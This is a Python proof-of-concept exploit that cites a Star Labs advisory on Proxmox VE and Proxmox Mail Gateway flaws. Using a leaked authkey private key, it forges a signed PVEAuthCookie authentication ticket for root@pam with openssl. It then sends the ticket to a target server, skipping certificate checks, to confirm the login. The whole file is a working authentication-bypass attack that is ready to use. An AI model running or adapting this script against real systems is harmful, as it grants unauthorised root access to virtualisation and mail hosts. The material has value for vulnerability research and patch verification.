#!/usr/bin/env python3

##
## https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file
##

import argparse
import requests
import logging
import json
import socket
import ssl
import urllib.parse
import re
import time
import subprocess
import base64
import tarfile
import io
import tempfile
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {}  # {'https': '127.0.0.1:8080'}
logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO)


def generate_ticket(authkey_bytes, username="root@pam", time_offset=-30):
    timestamp = hex(int(time.time()) + time_offset)[2:].upper()
    plaintext = f"PVE:{username}:{timestamp}"

    authkey_path = tempfile.NamedTemporaryFile(delete=False)
    logging.info(f"writing authkey to {authkey_path.name}")
    authkey_path.write(authkey_bytes)
    authkey_path.close()

    txt_path = tempfile.NamedTemporaryFile(delete=False)
    logging.info(f"writing plaintext to {txt_path.name}")
    txt_path.write(plaintext.encode("utf-8"))
    txt_path.close()

    logging.info(f"calling openssl to sign")
    sig = subprocess.check_output(
        [
            "openssl",
            "dgst",
            "-sha1",
            "-sign",
            authkey_path.name,
            "-out",
            "-",
            txt_path.name,
        ]
    )
    sig = base64.b64encode(sig).decode("latin-1")

    ret = f"{plaintext}::{sig}"
    logging.info(f"generated ticket for {username}: {ret}")
    logging.info(f"Login with cookie:\nPVEAuthCookie={ret}")

    return ret


def _parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", metavar="key", required=True, help="The private key file")
    parser.add_argument(
        "-g", metavar="generate_for", default="root@pam", help="Default: root@pam"
    )
    parser.add_argument(
        "-t",
        metavar="target_url",
        help="Please keep the trailing slash, example: https://10.10.6.6:6969/",
        required=True,
    )
    return parser.parse_args()


if __name__ == "__main__":
    arg = _parse_args()
    authkey_bytes = open(arg.k, "rb").read()
    new_ticket = generate_ticket(authkey_bytes, username=arg.g)

    logging.info("veryfing ticket")
    req = requests.get(
        arg.t,
        headers={"Cookie": f"PVEAuthCookie={new_ticket}"},
        proxies=PROXIES,
        verify=False,
    )
    print(req.text)
    res = req.content.decode("utf-8")
    verify_re = re.compile("UserName: '(.*?)',\n\s+CSRFPreventionToken:")
    verify_result = verify_re.findall(res)
    logging.info(f"current user: {verify_result[0]}")
    logging.info(f"Cookie: PVEAuthCookie={urllib.parse.quote_plus(new_ticket)}")
  
##
##
##
